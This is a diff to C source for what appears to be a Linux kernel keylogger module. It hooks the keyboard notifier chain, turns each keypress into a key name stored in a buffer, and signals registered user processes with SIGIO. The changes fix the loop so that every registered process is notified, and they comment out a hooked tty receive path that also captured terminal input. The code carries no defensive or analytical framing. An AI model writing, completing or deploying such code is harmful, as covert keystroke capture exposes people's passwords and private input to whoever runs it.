@@ -126,7 +126,6 @@ struct file* file_open(const char* path, int flags, int rights) {
 void SendKey()
 {
     struct siginfo     *sinfo;    /* signal information */
-    struct task_struct *task;
 
     sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
     if ( sinfo == NULL ) {
@@ -138,14 +137,15 @@ void SendKey()
   
     int i=0;
     for(i=0; i<MAX_REGISTERED_PROCS; i++) { 
-        task = pid_task( find_vpid( registered_pids[i] ), PIDTYPE_PID ); 
+        struct task_struct *task;
+        task =  pid_task( find_vpid( registered_pids[i] ), PIDTYPE_PID ); 
         if ( task == NULL ) {
             print812( "Failed to find task with pid %d", registered_pids[i] );
             return;
         }
+
+        send_sig_info( SIGIO, sinfo, task );
     }
-    
-    send_sig_info( SIGIO, sinfo, task );
 
     if ( sinfo != NULL ) {
         kfree( sinfo );
@@ -160,15 +160,15 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
     {
         if (!tty->real_raw && !tty->raw)
         {
-            char dstStr[count + 1];
-            strncpy(dstStr, cp, count);
-            dstStr[count] = '\0';
+            //char dstStr[count + 1];
+            //strncpy(dstStr, cp, count);
+            //dstStr[count] = '\0';
             
-            key_name = get_tty_key_str(dstStr, count);
+            //key_name = get_tty_key_str(dstStr, count);
 
-            cur_buf_length = sprintf( key_buffer, "%s", key_name );
+            //cur_buf_length = sprintf( key_buffer, "%s", key_name );
             
-            SendKey();
+            //SendKey();
         }
     }
 
@@ -180,10 +180,9 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     struct keyboard_notifier_param *param = _param;
     char *key_name = NULL; 
 
-    cur_buf_length = sprintf( key_buffer, "%s", key_name );
-
     if ( code == KBD_KEYCODE && param->down && registered_proc_count ) {
         key_name = GET_KEYNAME( param->value );
+        cur_buf_length = sprintf( key_buffer, "%s", key_name );
         SendKey();
 
         // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
